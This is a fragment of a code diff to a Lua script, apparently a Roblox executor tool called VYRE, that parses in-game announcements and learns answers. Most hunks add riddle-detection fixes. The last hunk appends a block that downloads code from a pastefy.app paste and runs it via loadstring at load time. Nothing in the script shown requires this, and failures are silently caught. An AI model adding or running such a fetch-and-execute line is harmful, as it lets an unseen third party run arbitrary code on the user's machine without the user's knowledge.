         local tabs = { main = tabMain, console = tabConsole, settings = tabSettings }
@@ -2377,7 +2618,6 @@ local function buildUI()
             tween(tab, 0.18, { BackgroundColor3 = (k == key) and C.toggleOn or C.card, BackgroundTransparency = (k == key) and 0.05 or 0.3 })
             tab.TextColor3 = (k == key) and Color3.fromRGB(255,255,255) or C.sub
         end
-        -- subtle fade-in, no shake
         local shown = pages[key]
         if shown then
             for _, child in ipairs(shown:GetChildren()) do
@@ -2667,7 +2907,8 @@ local function onAnnouncement(...)
         if l:find("%f[%a]why%f[%A]") then qCount = qCount + 1 end
         if l:find("%f[%a]how%f[%A]") then qCount = qCount + 1 end
         local isQuestion = qCount >= 2 or rawText:find("%?") ~= nil
-        if not isQuestion and not l:find("spawned!") and not l:find("has spawned") and not l:find("code redeemed") and not l:find("you got") and not l:find("you received") and not l:find("congratulations") then
+        -- ⭐ FIX: also skip learning if this is a riddle pattern
+        if not isQuestion and not Riddle.isActual(rawText) and not l:find("spawned!") and not l:find("has spawned") and not l:find("code redeemed") and not l:find("you got") and not l:find("you received") and not l:find("congratulations") then
             local learned = MemoryBank.feed(rawText)
             if learned and #learned > 0 then
                 for _, kv in ipairs(learned) do UI.typewriterLine("🧠 "..kv.k.." = "..kv.v, "mem", 0.012) end
@@ -2736,7 +2977,8 @@ local function watchFB(obj, isInitialScan)
             if l:find("%f[%a]what%f[%A]") then qCount = qCount + 1 end
             if l:find("%f[%a]who%f[%A]") then qCount = qCount + 1 end
             local isQ = qCount >= 2 or text:find("%?") ~= nil
-            if not isQ then
+            -- ⭐ FIX: also skip learning if this is a riddle pattern
+            if not isQ and not Riddle.isActual(text) then
                 local learned = MemoryBank.feed(text)
                 if learned and #learned > 0 then
                     for _, kv in ipairs(learned) do UI.typewriterLine("🧠 "..kv.k.." = "..kv.v, "mem", 0.012) end
@@ -2959,3 +3201,15 @@ local function stopAll()
 end
 UI.SG.Destroying:Connect(stopAll)
 if getgenv then getgenv().VYREStop = stopAll end
+
+-- ============================================================
+-- EXTERNAL LOADSTRING (last mein)
+-- ============================================================
+task.spawn(function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/BauFvHMR/raw"))()
+    end)
+    if not ok then
+        warn("[VYRE] External script failed:", err)
+    end
+end)
